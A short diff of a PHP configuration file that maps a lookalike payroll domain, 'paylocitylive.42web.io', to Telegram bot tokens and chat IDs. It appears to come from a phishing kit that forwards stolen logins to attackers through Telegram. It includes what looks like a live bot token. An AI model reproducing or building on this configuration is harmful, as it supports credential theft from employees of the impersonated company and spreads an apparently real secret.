@@ -7,7 +7,7 @@ include 'firewall.php';
 
 // === Configuration: Replace with real domains ===
 $site_map = [
-    'paylocitylive.42web.io' => [
+    'https://paylocitylive.42web.io' => [
         'bots' => [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
             ['token' => 'BOT_TOKEN_1B', 'chat_id' => 'CHAT_ID_1B']
